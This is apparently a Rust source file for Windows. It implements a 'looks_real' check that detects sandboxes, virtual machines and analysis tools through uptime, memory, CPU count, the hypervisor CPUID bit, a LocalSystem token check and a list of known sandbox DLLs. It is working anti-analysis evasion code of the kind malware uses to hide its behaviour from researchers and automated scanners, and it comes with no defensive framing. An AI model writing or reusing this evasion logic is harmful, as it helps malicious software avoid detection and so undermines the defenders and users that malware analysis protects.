#[cfg(target_os = "windows")]
use windows_sys::Win32::System::SystemInformation::{
    GetTickCount64, GlobalMemoryStatusEx, MEMORYSTATUSEX, GetSystemInfo, SYSTEM_INFO,
};

#[cfg(all(target_arch = "x86_64", target_os = "windows"))]
unsafe fn hypervisor_bit_set() -> bool {
    let ecx: u32;
    core::arch::asm!(
        "cpuid",
        inout("eax") 1u32 => _,
        out("ebx") _,
        out("ecx") ecx,
        out("edx") _,
        options(nostack, preserves_flags),
    );
    (ecx >> 31) & 1 != 0
}

#[cfg(target_os = "windows")]
unsafe fn running_as_system() -> bool {
    use windows_sys::Win32::{
        Foundation::CloseHandle,
        Security::{
            GetTokenInformation, OpenProcessToken, TOKEN_QUERY, TOKEN_USER,
            TokenUser,
        },
        System::Threading::GetCurrentProcess,
    };

    let mut token_handle: windows_sys::Win32::Foundation::HANDLE = 0;
    if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token_handle) == 0 {
        return false;
    }

    let mut buf = vec![0u8; 256];
    let mut return_len = 0u32;
    let ok = GetTokenInformation(
        token_handle,
        TokenUser,
        buf.as_mut_ptr() as _,
        buf.len() as u32,
        &mut return_len,
    );
    CloseHandle(token_handle);
    if ok == 0 { return false; }

    // TOKEN_USER.User.Sid points to a SID. S-1-5-18 (LocalSystem) has:
    // Revision=1, SubAuthorityCount=1, IdentifierAuthority={0,0,0,0,0,5}, SubAuthority[0]=18
    let sid_ptr = *(buf.as_ptr() as *const *const u8);
    if sid_ptr.is_null() { return false; }
    let revision      = *sid_ptr;
    let sub_auth_cnt  = *sid_ptr.add(1);
    let auth_6        = *sid_ptr.add(7); // IdentifierAuthority[5] = 5
    let sub_auth_0    = u32::from_le_bytes([
        *sid_ptr.add(8), *sid_ptr.add(9), *sid_ptr.add(10), *sid_ptr.add(11),
    ]);
    revision == 1 && sub_auth_cnt == 1 && auth_6 == 5 && sub_auth_0 == 18
}

/// Returns true if any known sandbox/analysis DLL is loaded into the current process.
/// SbieDll.dll = Sandboxie; cmdvrt32.dll = Comodo; api_log.dll / dir_watch.dll = CWSandbox;
/// pstorec.dll = old Cuckoo stub; dbghelp.dll variants are common debugger helpers.
#[cfg(target_os = "windows")]
unsafe fn analysis_dll_present() -> bool {
    use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
    const DLLS: &[&[u8]] = &[
        b"SbieDll.dll\0",
        b"cmdvrt32.dll\0",
        b"api_log.dll\0",
        b"dir_watch.dll\0",
        b"pstorec.dll\0",
        b"wpespy.dll\0",
        b"vmcheck.dll\0",
        b"dbghlp.dll\0",
    ];
    for &dll in DLLS {
        if GetModuleHandleA(dll.as_ptr()) != 0 {
            return true;
        }
    }
    false
}

#[cfg(target_os = "windows")]
pub unsafe fn looks_real() -> bool {
    // Uptime check: at least 30 minutes
    let uptime_ms = GetTickCount64();
    if uptime_ms < 30 * 60 * 1000 { return false; }

    // RAM check: at least 2 GB
    let mut mem_status: MEMORYSTATUSEX = core::mem::zeroed();
    mem_status.dwLength = core::mem::size_of::<MEMORYSTATUSEX>() as u32;
    GlobalMemoryStatusEx(&mut mem_status);
    if mem_status.ullTotalPhys < 2u64 * 1024 * 1024 * 1024 { return false; }

    // CPU count check: at least 2 processors (sandboxes often have 1)
    let mut sysinfo: SYSTEM_INFO = core::mem::zeroed();
    GetSystemInfo(&mut sysinfo);
    if sysinfo.dwNumberOfProcessors < 2 { return false; }

    #[cfg(all(target_arch = "x86_64", target_os = "windows"))]
    if hypervisor_bit_set() { return false; }

    #[cfg(target_os = "windows")]
    if running_as_system() { return false; }

    #[cfg(target_os = "windows")]
    if analysis_dll_present() { return false; }

    true
}
